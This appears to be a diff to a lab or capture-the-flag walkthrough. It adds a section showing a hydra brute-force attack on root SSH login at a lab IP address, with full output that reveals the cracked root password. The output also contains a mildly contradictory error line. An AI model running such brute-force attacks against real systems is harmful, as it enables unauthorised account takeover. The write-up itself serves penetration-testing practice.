@@ -416,7 +416,26 @@ www-data@srv-99-590:~/html$
 - Now we have a shell as the www-data user
 
 ### Method 3 - Brute Force SSH
+- We can use hydra to brute force ssh on the server
 
+```
+┌──(kali㉿kali-99-590)-[~/exploits]
+└─$ hydra -l root -P /usr/share/wordlists/fasttrack.txt  10.1.26.30 ssh
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-06 16:11:34
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking ssh://10.1.26.30:22/
+[STATUS] 166.00 tries/min, 166 tries in 00:01h, 57 to do in 00:01h, 15 active
+[22][ssh] host: 10.1.26.30   login: root   password: dragon
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-06 16:13:19
+```
 
 ## Local Enumeration 
 
